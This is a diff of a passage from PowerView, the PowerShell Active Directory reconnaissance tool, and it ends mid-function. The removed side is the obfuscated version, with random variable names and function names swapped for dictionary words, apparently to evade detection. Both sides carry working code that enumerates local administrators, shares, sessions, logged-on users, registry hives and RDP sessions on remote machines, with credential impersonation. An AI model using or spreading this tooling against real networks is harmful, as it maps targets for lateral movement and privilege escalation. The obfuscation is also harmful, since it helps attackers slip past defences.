+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            if ($AlrHOHqQ99 -eq 'API') {
-                $TNhhTnXZ99 = 1
-                $TuHFtCTR99 = [IntPtr]::Zero
-                $FHpQkwbc99 = 0
-                $wWzmonqN99 = 0
-                $rVQOkgHx99 = 0
-                $fYOedlSN99 = $eIekXKWj99::NetLocalGroupEnum($cXOPCAwl99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
-                $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
-                if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
-                    $TYJIVmOK99 = $glIboXpK99::GetSize()
-                    for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
-                        $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                        $Info = $UeHktdvI99 -as $glIboXpK99
-                        $KUsFrgdb99 = $UeHktdvI99.ToInt64()
-                        $KUsFrgdb99 += $TYJIVmOK99
-                        $KqYbWZot99 = New-Object PSObject
-                        $KqYbWZot99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                        $KqYbWZot99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
-                        $KqYbWZot99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
-                        $KqYbWZot99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
-                        $KqYbWZot99
+        ForEach ($Computer in $ComputerName) {
+            if ($Method -eq 'API') {
+                $QueryLevel = 1
+                $PtrInfo = [IntPtr]::Zero
+                $EntriesRead = 0
+                $TotalRead = 0
+                $ResumeHandle = 0
+                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+                $Offset = $PtrInfo.ToInt64()
+                if (($Result -eq 0) -and ($Offset -gt 0)) {
+                    $Increment = $LOCALGROUP_INFO_1::GetSize()
+                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1
+                        $Offset = $NewIntPtr.ToInt64()
+                        $Offset += $Increment
+                        $LocalGroup = New-Object PSObject
+                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer
+                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
+                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
+                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
+                        $LocalGroup
                     }
-                    $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
+                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
                 }
                 else {
-                    Write-Verbose "[Wheaties] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
+                    Write-Verbose "[jungle] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                 }
             }
             else {
-                $EGqbIuns99 = [ADSI]"WinNT://$cXOPCAwl99,computer"
-                $EGqbIuns99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
-                    $KqYbWZot99 = ([ADSI]$_)
+                $ComputerProvider = [ADSI]"WinNT://$Computer,computer"
+                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
+                    $LocalGroup = ([ADSI]$_)
                     $Group = New-Object PSObject
-                    $Group | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                    $Group | Add-Member Noteproperty 'GroupName' ($KqYbWZot99.InvokeGet('Name'))
-                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($KqYbWZot99.InvokeGet('objectsid'),0)).Value)
-                    $Group | Add-Member Noteproperty 'Comment' ($KqYbWZot99.InvokeGet('Description'))
+                    $Group | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))
+                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)
+                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))
                     $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                     $Group
                 }
@@ -7053,12 +7053,12 @@ function Wheaties {
     }
     
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function stipends {
+function epiglottides {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.LocalGroupMember.API')]
     [OutputType('PowerView.LocalGroupMember.WinNT')]
@@ -7067,65 +7067,65 @@ function stipends {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = $Env:COMPUTERNAME,
+        $ComputerName = $Env:COMPUTERNAME,
         [Parameter(ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SZjbzmKX99 = 'Administrators',
+        $GroupName = 'Administrators',
         [ValidateSet('API', 'WinNT')]
         [Alias('CollectionMethod')]
         [String]
-        $AlrHOHqQ99 = 'API',
+        $Method = 'API',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            if ($AlrHOHqQ99 -eq 'API') {
-                $TNhhTnXZ99 = 2
-                $TuHFtCTR99 = [IntPtr]::Zero
-                $FHpQkwbc99 = 0
-                $wWzmonqN99 = 0
-                $rVQOkgHx99 = 0
-                $fYOedlSN99 = $eIekXKWj99::NetLocalGroupGetMembers($cXOPCAwl99, $SZjbzmKX99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
-                $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
-                $SvCMbRzc99 = @()
-                if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
-                    $TYJIVmOK99 = $AAOdZRRi99::GetSize()
-                    for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
-                        $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                        $Info = $UeHktdvI99 -as $AAOdZRRi99
-                        $KUsFrgdb99 = $UeHktdvI99.ToInt64()
-                        $KUsFrgdb99 += $TYJIVmOK99
-                        $LheQlAxo99 = ''
-                        $zBVlYYvn99 = $hVuDLVbw99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$LheQlAxo99);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                        if ($zBVlYYvn99 -eq 0) {
-                            Write-Verbose "[stipends] Error: $(([ComponentModel.Win32Exception] $HWqgzfQS99).Message)"
+        ForEach ($Computer in $ComputerName) {
+            if ($Method -eq 'API') {
+                $QueryLevel = 2
+                $PtrInfo = [IntPtr]::Zero
+                $EntriesRead = 0
+                $TotalRead = 0
+                $ResumeHandle = 0
+                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+                $Offset = $PtrInfo.ToInt64()
+                $Members = @()
+                if (($Result -eq 0) -and ($Offset -gt 0)) {
+                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()
+                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2
+                        $Offset = $NewIntPtr.ToInt64()
+                        $Offset += $Increment
+                        $SidString = ''
+                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+                        if ($Result2 -eq 0) {
+                            Write-Verbose "[epiglottides] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                         }
                         else {
-                            $cgTuSBdj99 = New-Object PSObject
-                            $cgTuSBdj99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                            $cgTuSBdj99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
-                            $cgTuSBdj99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
-                            $cgTuSBdj99 | Add-Member Noteproperty 'SID' $LheQlAxo99
-                            $sYCvPfIx99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
-                            $cgTuSBdj99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
-                            $cgTuSBdj99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
-                            $SvCMbRzc99 += $cgTuSBdj99
+                            $Member = New-Object PSObject
+                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
+                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
+                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
+                            $Member | Add-Member Noteproperty 'SID' $SidString
+                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
+                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
+                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
+                            $Members += $Member
                         }
                     }
-                    $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
-                    $JqPnXIZk99 = $SvCMbRzc99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
-                    if ($JqPnXIZk99) {
-                        $JqPnXIZk99 = $JqPnXIZk99.Substring(0, $JqPnXIZk99.LastIndexOf('-'))
-                        $SvCMbRzc99 | ForEach-Object {
-                            if ($_.SID -match $JqPnXIZk99) {
+                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)
+                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
+                    if ($MachineSid) {
+                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))
+                        $Members | ForEach-Object {
+                            if ($_.SID -match $MachineSid) {
                                 $_ | Add-Member Noteproperty 'IsDomain' $False
                             }
                             else {
@@ -7134,7 +7134,7 @@ function stipends {
                         }
                     }
                     else {
-                        $SvCMbRzc99 | ForEach-Object {
+                        $Members | ForEach-Object {
                             if ($_.SID -notmatch 'S-1-5-21') {
                                 $_ | Add-Member Noteproperty 'IsDomain' $False
                             }
@@ -7143,51 +7143,51 @@ function stipends {
                             }
                         }
                     }
-                    $SvCMbRzc99
+                    $Members
                 }
                 else {
-                    Write-Verbose "[stipends] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
+                    Write-Verbose "[epiglottides] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                 }
             }
             else {
                 try {
-                    $qsMDMLdO99 = [ADSI]"WinNT://$cXOPCAwl99/$SZjbzmKX99,group"
-                    $qsMDMLdO99.psbase.Invoke('Members') | ForEach-Object {
-                        $cgTuSBdj99 = New-Object PSObject
-                        $cgTuSBdj99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                        $cgTuSBdj99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
-                        $JmxOsema99 = ([ADSI]$_)
-                        $kyQNtJlp99 = $JmxOsema99.InvokeGet('AdsPath').Replace('WinNT://', '')
-                        $sYCvPfIx99 = ($JmxOsema99.SchemaClassName -like 'group')
-                        if(([regex]::Matches($kyQNtJlp99, '/')).count -eq 1) {
-                            $OjkpjjAj99 = $True
-                            $Name = $kyQNtJlp99.Replace('/', '\')
+                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"
+                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {
+                        $Member = New-Object PSObject
+                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
+                        $Member | Add-Member Noteproperty 'GroupName' $GroupName
+                        $LocalUser = ([ADSI]$_)
+                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
+                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')
+                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
+                            $MemberIsDomain = $True
+                            $Name = $AdsPath.Replace('/', '\')
                         }
                         else {
-                            $OjkpjjAj99 = $False
-                            $Name = $kyQNtJlp99.Substring($kyQNtJlp99.IndexOf('/')+1).Replace('/', '\')
+                            $MemberIsDomain = $False
+                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                         }
-                        $cgTuSBdj99 | Add-Member Noteproperty 'AccountName' $Name
-                        $cgTuSBdj99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($JmxOsema99.InvokeGet('ObjectSID'),0)).Value)
-                        $cgTuSBdj99 | Add-Member Noteproperty 'IsGroup' $sYCvPfIx99
-                        $cgTuSBdj99 | Add-Member Noteproperty 'IsDomain' $OjkpjjAj99
-                        $cgTuSBdj99
+                        $Member | Add-Member Noteproperty 'AccountName' $Name
+                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
+                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
+                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain
+                        $Member
                     }
                 }
                 catch {
-                    Write-Verbose "[stipends] Error for $cXOPCAwl99 : $_"
+                    Write-Verbose "[epiglottides] Error for $Computer : $_"
                 }
             }
         }
     }
     
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function well {
+function tackier {
     [OutputType('PowerView.ShareInfo')]
     [CmdletBinding()]
     Param(
@@ -7195,51 +7195,51 @@ function well {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            $TNhhTnXZ99 = 1
-            $TuHFtCTR99 = [IntPtr]::Zero
-            $FHpQkwbc99 = 0
-            $wWzmonqN99 = 0
-            $rVQOkgHx99 = 0
-            $fYOedlSN99 = $eIekXKWj99::NetShareEnum($cXOPCAwl99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
-            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
-            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
-                $TYJIVmOK99 = $LHsSdVmM99::GetSize()
-                for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
-                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                    $Info = $UeHktdvI99 -as $LHsSdVmM99
+        ForEach ($Computer in $ComputerName) {
+            $QueryLevel = 1
+            $PtrInfo = [IntPtr]::Zero
+            $EntriesRead = 0
+            $TotalRead = 0
+            $ResumeHandle = 0
+            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+            $Offset = $PtrInfo.ToInt64()
+            if (($Result -eq 0) -and ($Offset -gt 0)) {
+                $Increment = $SHARE_INFO_1::GetSize()
+                for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                    $Info = $NewIntPtr -as $SHARE_INFO_1
                     $Share = $Info | Select-Object *
-                    $Share | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
+                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                     $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
-                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
-                    $KUsFrgdb99 += $TYJIVmOK99
+                    $Offset = $NewIntPtr.ToInt64()
+                    $Offset += $Increment
                     $Share
                 }
-                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
+                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[well] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
+                Write-Verbose "[tackier] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function Darla {
+function Tuamotu {
     [OutputType('PowerView.LoggedOnUserInfo')]
     [CmdletBinding()]
     Param(
@@ -7247,51 +7247,51 @@ function Darla {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            $TNhhTnXZ99 = 1
-            $TuHFtCTR99 = [IntPtr]::Zero
-            $FHpQkwbc99 = 0
-            $wWzmonqN99 = 0
-            $rVQOkgHx99 = 0
-            $fYOedlSN99 = $eIekXKWj99::NetWkstaUserEnum($cXOPCAwl99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
-            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
-            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
-                $TYJIVmOK99 = $AYxUHfXy99::GetSize()
-                for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
-                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                    $Info = $UeHktdvI99 -as $AYxUHfXy99
-                    $FjaaNWoN99 = $Info | Select-Object *
-                    $FjaaNWoN99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                    $FjaaNWoN99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
-                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
-                    $KUsFrgdb99 += $TYJIVmOK99
-                    $FjaaNWoN99
+        ForEach ($Computer in $ComputerName) {
+            $QueryLevel = 1
+            $PtrInfo = [IntPtr]::Zero
+            $EntriesRead = 0
+            $TotalRead = 0
+            $ResumeHandle = 0
+            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+            $Offset = $PtrInfo.ToInt64()
+            if (($Result -eq 0) -and ($Offset -gt 0)) {
+                $Increment = $WKSTA_USER_INFO_1::GetSize()
+                for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1
+                    $LoggedOn = $Info | Select-Object *
+                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
+                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
+                    $Offset = $NewIntPtr.ToInt64()
+                    $Offset += $Increment
+                    $LoggedOn
                 }
-                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
+                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[Darla] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
+                Write-Verbose "[Tuamotu] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function lagging {
+function ploughshares {
     [OutputType('PowerView.SessionInfo')]
     [CmdletBinding()]
     Param(
@@ -7299,51 +7299,51 @@ function lagging {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            $TNhhTnXZ99 = 10
-            $TuHFtCTR99 = [IntPtr]::Zero
-            $FHpQkwbc99 = 0
-            $wWzmonqN99 = 0
-            $rVQOkgHx99 = 0
-            $fYOedlSN99 = $eIekXKWj99::NetSessionEnum($cXOPCAwl99, '', $IsWOPBva99, $TNhhTnXZ99, [ref]$TuHFtCTR99, -1, [ref]$FHpQkwbc99, [ref]$wWzmonqN99, [ref]$rVQOkgHx99)
-            $KUsFrgdb99 = $TuHFtCTR99.ToInt64()
-            if (($fYOedlSN99 -eq 0) -and ($KUsFrgdb99 -gt 0)) {
-                $TYJIVmOK99 = $LsQgOFsN99::GetSize()
-                for ($i = 0; ($i -lt $FHpQkwbc99); $i++) {
-                    $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                    $Info = $UeHktdvI99 -as $LsQgOFsN99
-                    $ExnuZhXQ99 = $Info | Select-Object *
-                    $ExnuZhXQ99 | Add-Member Noteproperty 'ComputerName' $cXOPCAwl99
-                    $ExnuZhXQ99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
-                    $KUsFrgdb99 = $UeHktdvI99.ToInt64()
-                    $KUsFrgdb99 += $TYJIVmOK99
-                    $ExnuZhXQ99
+        ForEach ($Computer in $ComputerName) {
+            $QueryLevel = 10
+            $PtrInfo = [IntPtr]::Zero
+            $EntriesRead = 0
+            $TotalRead = 0
+            $ResumeHandle = 0
+            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)
+            $Offset = $PtrInfo.ToInt64()
+            if (($Result -eq 0) -and ($Offset -gt 0)) {
+                $Increment = $SESSION_INFO_10::GetSize()
+                for ($i = 0; ($i -lt $EntriesRead); $i++) {
+                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
+                    $Info = $NewIntPtr -as $SESSION_INFO_10
+                    $Session = $Info | Select-Object *
+                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
+                    $Offset = $NewIntPtr.ToInt64()
+                    $Offset += $Increment
+                    $Session
                 }
-                $Null = $eIekXKWj99::NetApiBufferFree($TuHFtCTR99)
+                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
             }
             else {
-                Write-Verbose "[lagging] Error: $(([ComponentModel.Win32Exception] $fYOedlSN99).Message)"
+                Write-Verbose "[ploughshares] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
             }
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function deepening {
+function millstone {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.RegLoggedOnUser')]
     [CmdletBinding()]
@@ -7352,47 +7352,47 @@ function deepening {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost'
+        $ComputerName = 'localhost'
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
+        ForEach ($Computer in $ComputerName) {
             try {
-                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$VrEmrUHq99")
+                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")
                 $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
-                    $IsWOPBva99 = woodmen -ObjectSID $_ -OutputType 'DomainSimple'
-                    if ($IsWOPBva99) {
-                        $IsWOPBva99, $ojqqfkye99 = $IsWOPBva99.Split('@')
+                    $UserName = armpits -ObjectSID $_ -OutputType 'DomainSimple'
+                    if ($UserName) {
+                        $UserName, $UserDomain = $UserName.Split('@')
                     }
                     else {
-                        $IsWOPBva99 = $_
-                        $ojqqfkye99 = $Null
+                        $UserName = $_
+                        $UserDomain = $Null
                     }
-                    $dhXopAgv99 = New-Object PSObject
-                    $dhXopAgv99 | Add-Member Noteproperty 'ComputerName' "$VrEmrUHq99"
-                    $dhXopAgv99 | Add-Member Noteproperty 'UserDomain' $ojqqfkye99
-                    $dhXopAgv99 | Add-Member Noteproperty 'UserName' $IsWOPBva99
-                    $dhXopAgv99 | Add-Member Noteproperty 'UserSID' $_
-                    $dhXopAgv99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
-                    $dhXopAgv99
+                    $RegLoggedOnUser = New-Object PSObject
+                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
+                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
+                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
+                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
+                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
+                    $RegLoggedOnUser
                 }
             }
             catch {
-                Write-Verbose "[deepening] Error opening remote registry on '$VrEmrUHq99' : $_"
+                Write-Verbose "[millstone] Error opening remote registry on '$ComputerName' : $_"
             }
         }
     }
     END {
-        if ($WUqPycDr99) {
-            Nina -TokenHandle $WUqPycDr99
+        if ($LogonToken) {
+            choke -TokenHandle $LogonToken
         }
     }
 }
-function sprucing {
+function Brooke {
     [OutputType('PowerView.RDPSessionInfo')]
     [CmdletBinding()]
     Param(
@@ -7400,88 +7400,88 @@ function sprucing {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $VrEmrUHq99 = 'localhost',
+        $ComputerName = 'localhost',
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     BEGIN {
         if ($PSBoundParameters['Credential']) {
-            $WUqPycDr99 = admonished -Credential $gxazvivN99
+            $LogonToken = locale -Credential $Credential
         }
     }
     PROCESS {
-        ForEach ($cXOPCAwl99 in $VrEmrUHq99) {
-            $TSTkwzwk99 = $ppPvwAgU99::WTSOpenServerEx($cXOPCAwl99)
-            if ($TSTkwzwk99 -ne 0) {
-                $oUzPXxNr99 = [IntPtr]::Zero
-                $vUANPdTP99 = 0
-                $fYOedlSN99 = $ppPvwAgU99::WTSEnumerateSessionsEx($TSTkwzwk99, [ref]1, 0, [ref]$oUzPXxNr99, [ref]$vUANPdTP99);$HWqgzfQS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                $KUsFrgdb99 = $oUzPXxNr99.ToInt64()
-                if (($fYOedlSN99 -ne 0) -and ($KUsFrgdb99 -gt 0)) {
-                    $TYJIVmOK99 = $lqYeGqBq99::GetSize()
-                    for ($i = 0; ($i -lt $vUANPdTP99); $i++) {
-                        $UeHktdvI99 = New-Object System.Intptr -ArgumentList $KUsFrgdb99
-                        $Info = $UeHktdvI99 -as $lqYeGqBq99
-                        $SPvcmVuz99 = New-Object PSObject
+        ForEach ($Computer in $ComputerName) {
+            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)
+            if ($Handle -ne 0) {
+                $ppSessionInfo = [IntPtr]::Zero
+                $pCount = 0
+                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
